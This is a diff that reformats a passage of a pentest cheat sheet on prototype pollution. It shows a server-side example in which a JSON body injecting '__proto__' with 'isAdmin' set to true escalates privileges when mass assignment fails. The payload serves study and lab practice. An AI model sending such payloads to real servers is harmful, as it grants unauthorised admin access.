@@ -1,4 +1,4 @@
-[#](#) Prototype Pollution
+# Prototype Pollution
 
 > While browsing, `?constructor[prototype]...` content flashes in the URL bar? Yes, then try to exploit this...
 
@@ -77,33 +77,34 @@ async function searchLogger() {
 ## Server Side
 
 
-    ```
-    POST /ChaneAddress
-    {
-        "City": "foo",
-        "Address": 1234,
-    }
-    ```
+```
+POST /ChaneAddress
+{
+    "City": "foo",
+    "Address": 1234,
+}
+```
 
-    ```
-    HTTP/2 200 OK
-    
-    {
-        "username": "wiener",
-        "City": "foo",
-        "Address": 1234,
-        "isAdmin":true
-    }
+```
+HTTP/2 200 OK
 
-    ```
+{
+    "username": "wiener",
+    "City": "foo",
+    "Address": 1234,
+    "isAdmin":true
+}
+
+```
+
 Mass assignement not working? Try prototype pollution.
 
-    ```
-    {
-        "City": "foo",
-        "Address": 1234,
-        "__proto__": {
-            "isAdmin":"true"
-        }
+```
+{
+    "City": "foo",
+    "Address": 1234,
+    "__proto__": {
+        "isAdmin":"true"
     }
+}
     ```
